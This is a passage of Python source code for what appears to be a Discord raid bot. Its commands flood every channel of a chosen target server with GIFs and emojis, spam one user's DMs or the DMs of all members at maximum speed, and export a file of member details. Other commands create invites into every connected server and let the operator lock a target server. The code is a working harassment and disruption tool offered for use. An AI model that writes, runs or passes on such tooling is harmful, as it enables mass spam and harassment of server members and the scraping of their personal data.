async def cmd_spam_gif(ctx):
    log_action("Executing spam-gif command", "PROCESSING")
    guild = await get_active_guild(ctx)
    active_tasks[guild.id] = True
    channels = guild.text_channels

    async def loop_gif(ch):
        while active_tasks.get(guild.id, True):
            try:
                await ch.send(SPECIFIC_GIF)
            except discord.HTTPException:
                pass
            await asyncio.sleep(0)

    for ch in channels:
        asyncio.create_task(loop_gif(ch))
        
    embed = discord.Embed(title="GIF FLOOD", description="Spamming specific GIF at maximum speed across all channels.", color=0xFF0000)
    embed.set_footer(text="Made By Dx NxrU")
    await ctx.send(embed=embed)
    log_action("Spam-gif command executed successfully", "SUCCESS")

@bot.command(name="spam-emoji")
async def cmd_spam_emoji(ctx, emoji_set: str = DEFAULT_EMOJI):
    log_action("Executing spam-emoji command", "PROCESSING")
    guild = await get_active_guild(ctx)
    active_tasks[guild.id] = True
    channels = guild.text_channels

    async def loop_emoji(ch):
        while active_tasks.get(guild.id, True):
            try:
                await ch.send(emoji_set)
            except discord.HTTPException:
                pass
            await asyncio.sleep(0)

    for ch in channels:
        asyncio.create_task(loop_emoji(ch))
        
    embed = discord.Embed(title="EMOJI FLOOD", description="Spamming emojis at maximum speed across all channels.", color=0xFF0000)
    embed.set_footer(text="Made By Dx NxrU")
    await ctx.send(embed=embed)
    log_action("Spam-emoji command executed successfully", "SUCCESS")

@bot.command(name="spam-msg")
async def cmd_spam_msg(ctx, member: discord.Member, *, message: str):
    log_action("Executing spam-msg command", "PROCESSING")
    active_tasks[ctx.author.id] = True
    async def dm_spam():
        while active_tasks.get(ctx.author.id, True):
            try:
                await member.send(message)
            except discord.HTTPException:
                pass
            await asyncio.sleep(0)
    asyncio.create_task(dm_spam())
    embed = discord.Embed(title="DM SPAM", description=f"Direct message flooding target {member.mention} at maximum speed.", color=0xFF0000)
    embed.set_footer(text="Made By Dx NxrU")
    await ctx.send(embed=embed)
    log_action("Spam-msg command executed successfully", "SUCCESS")

@bot.command(name="spam-all-msg")
async def cmd_spam_all_msg(ctx, *, message: str):
    log_action("Executing spam-all-msg command", "PROCESSING")
    guild = await get_active_guild(ctx)
    active_tasks[guild.id] = True
    
    async def spam_member_dm(member):
        while active_tasks.get(guild.id, True):
            try:
                await member.send(message)
            except discord.HTTPException:
                pass
            await asyncio.sleep(0)

    for member in guild.members:
        if member.id == bot.user.id or member.bot:
            continue
        asyncio.create_task(spam_member_dm(member))
        
    embed = discord.Embed(title="MASS DM FLOOD", description="Flooding DMs of all server members at maximum speed.", color=0xFF0000)
    embed.set_footer(text="Made By Dx NxrU")
    await ctx.send(embed=embed)
    log_action("Spam-all-msg command executed successfully", "SUCCESS")

@bot.command(name="user-info")
async def cmd_user_info(ctx, member: discord.Member = None):
    log_action("Executing user-info command", "PROCESSING")
    if member is None:
        member = ctx.author

    embed = discord.Embed(title=f"USER PROFILE // {member.name}", color=0xFF0000)
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.add_field(name="Username", value=str(member), inline=True)
    embed.add_field(name="ID", value=str(member.id), inline=True)
    embed.add_field(name="Bot", value=str(member.bot), inline=True)
    embed.add_field(name="Created At", value=member.created_at.strftime("%Y-%m-%d %H:%M:%S"), inline=False)
    if hasattr(member, "joined_at") and member.joined_at:
        embed.add_field(name="Joined Server", value=member.joined_at.strftime("%Y-%m-%d %H:%M:%S"), inline=False)
    embed.set_footer(text="Made By Dx NxrU")
    await ctx.send(embed=embed)
    log_action("User-info command executed successfully", "SUCCESS")

@bot.command(name="dl-info")
async def cmd_dl_info(ctx):
    log_action("Executing dl-info command", "PROCESSING")
    guild = await get_active_guild(ctx)
    filename = f"members_detailed_info_{guild.id}.txt"
    
    try:
        async with ctx.typing():
            with open(filename, "w", encoding="utf-8") as f:
                f.write(f"==================================================\n")
                f.write(f"SERVER MEMBER DETAILED INFO EXPORT\n")
                f.write(f"Server Name: {guild.name}\n")
                f.write(f"Server ID: {guild.id}\n")
                f.write(f"Total Members Collected: {len(guild.members)}\n")
                f.write(f"==================================================\n\n")
                
                for member in guild.members:
                    roles = [r.name for r in member.roles if r != guild.default_role]
                    f.write(f"Display Name : {member.display_name}\n")
                    f.write(f"Username     : {str(member)}\n")
                    f.write(f"User ID      : {member.id}\n")
                    f.write(f"Bot Account  : {member.bot}\n")
                    f.write(f"Created At   : {member.created_at.strftime('%Y-%m-%d %H:%M:%S')}\n")
                    if member.joined_at:
                        f.write(f"Joined At    : {member.joined_at.strftime('%Y-%m-%d %H:%M:%S')}\n")
                    else:
                        f.write(f"Joined At    : Unknown\n")
                    f.write(f"Roles        : {', '.join(roles) if roles else 'None'}\n")
                    f.write(f"Avatar URL   : {member.display_avatar.url}\n")
                    f.write(f"--------------------------------------------------\n")
        
        await ctx.send(file=discord.File(filename))
        embed = discord.Embed(title="MEMBER INFO EXPORTED", description="Complete detailed member info file generated and downloaded successfully.", color=0xFF0000)
        embed.set_footer(text="Made By Dx NxrU")
        await ctx.send(embed=embed)
        log_action("Dl-info command executed successfully", "SUCCESS")
    except Exception as e:
        log_action(f"Dl-info failed: {e}", "ERROR")
    finally:
        try:
            if os.path.exists(filename):
                os.remove(filename)
        except:
            pass

@bot.command(name="bot")
async def cmd_bot(ctx, *, text: str):
    log_action("Executing bot command", "PROCESSING")
    try:
        if ctx.message.guild:
            asyncio.create_task(ctx.message.delete())
    except:
        pass
    embed = discord.Embed(description=text, color=0xFF0000)
    embed.set_footer(text="Made By Dx NxrU")
    await ctx.send(embed=embed)
    log_action("Bot echo command executed successfully", "SUCCESS")

@bot.command(name="show-sv", aliases=["show_sv"])
async def cmd_show_sv(ctx):
    log_action("Executing show-sv command", "PROCESSING")
    embed = discord.Embed(title="CONNECTED SERVERS", color=0xFF0000)
    for guild in bot.guilds:
        invite = "No Permission"
        try:
            for ch in guild.text_channels:
                if ch.permissions_for(guild.me).create_instant_invite:
                    inv = await ch.create_invite(max_age=300, max_uses=1)
                    invite = str(inv)
                    break
        except:
            pass
        embed.add_field(name=guild.name, value=f"ID: `{guild.id}`\nMembers: `{guild.member_count}`\nInvite: {invite}", inline=False)
    embed.set_footer(text="Made By Dx NxrU")
    await ctx.send(embed=embed)
    log_action("Show-sv command executed successfully", "SUCCESS")

class ServerSelectView(discord.ui.View):
    def __init__(self, guilds):
        super().__init__(timeout=60)
        self.selected_guild_id = None

        options = [
            discord.SelectOption(label=g.name[:99], value=str(g.id), description=f"Members: {g.member_count}")
            for g in guilds[:25]
        ]

        self.select = discord.ui.Select(placeholder="Choose target server...", options=options)
        self.select.callback = self.select_callback
        self.add_item(self.select)

        self.button = discord.ui.Button(label="Select Target", style=discord.ButtonStyle.danger)
        self.button.callback = self.button_callback
        self.add_item(self.button)

        self.stop_button = discord.ui.Button(label="Clear Target", style=discord.ButtonStyle.secondary)
        self.stop_button.callback = self.stop_callback
        self.add_item(self.stop_button)

    async def select_callback(self, interaction: discord.Interaction):
        self.selected_guild_id = int(self.select.values[0])
        await interaction.response.send_message(f"Selected ID: `{self.selected_guild_id}`. Click 'Select Target'.", ephemeral=True)

    async def button_callback(self, interaction: discord.Interaction):
        global selected_target_guild_id
        if self.selected_guild_id:
            selected_target_guild_id = self.selected_guild_id
            target_guild = bot.get_guild(selected_target_guild_id)
            log_action(f"Target locked to server: {target_guild.name if target_guild else selected_target_guild_id}", "SUCCESS")
            await interaction.response.send_message(f"Target locked to **{target_guild.name if target_guild else selected_target_guild_id}**.", ephemeral=True)
        else:
            await interaction.response.send_message("Please select a server first.", ephemeral=True)

    async def stop_callback(self, interaction: discord.Interaction):
        global selected_target_guild_id
        selected_target_guild_id = None
        log_action("Target server unlocked.", "INFO")
        await interaction.response.send_message("Target server cleared.", ephemeral=True)

@bot.command(name="select-sv", aliases=["select_sv"])
async def cmd_select_sv(ctx):
    log_action("Executing select-sv command", "PROCESSING")
    view = ServerSelectView(bot.guilds)
    embed = discord.Embed(title="SERVER SELECTOR", description="Select target server using the dropdown menu below:", color=0xFF0000)
    embed.set_footer(text="Made By Dx NxrU")
    await ctx.send(embed=embed, view=view)
    log_action("Select-sv interface displayed", "SUCCESS")

@bot.command(name="stop")
async def cmd_stop(ctx):
    log_action("Executing stop command", "PROCESSING")
    for key in list(active_tasks.keys()):
        active_tasks[key] = False
    embed = discord.Embed(title="OPERATIONS HALTED", description="All active background loops and tasks terminated.", color=0xFF0000)
    embed.set_footer(text="Made By Dx NxrU")
    await ctx.send(embed=embed)
    log_action("Operations halted successfully", "SUCCESS")

if __name__ == "__main__":
    bot.run(bot_token)
